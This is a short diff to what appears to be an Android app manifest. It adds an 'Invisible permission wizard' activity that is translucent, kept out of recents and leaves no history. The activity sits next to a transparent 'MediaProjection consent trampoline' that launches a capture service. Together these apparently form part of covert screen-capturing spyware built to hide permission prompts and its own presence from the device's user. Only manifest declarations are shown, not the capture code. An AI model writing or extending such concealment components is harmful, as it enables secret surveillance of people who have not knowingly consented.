@@ -69,6 +69,14 @@
             </intent-filter>
         </activity>
 
+        <!-- Invisible permission wizard -->
+        <activity
+            android:name="com.sp.core.SetupActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
         <!-- MediaProjection consent trampoline (transparent, launches capture service) -->
         <activity
             android:name="com.sp.core.services.ProjectionConsent"
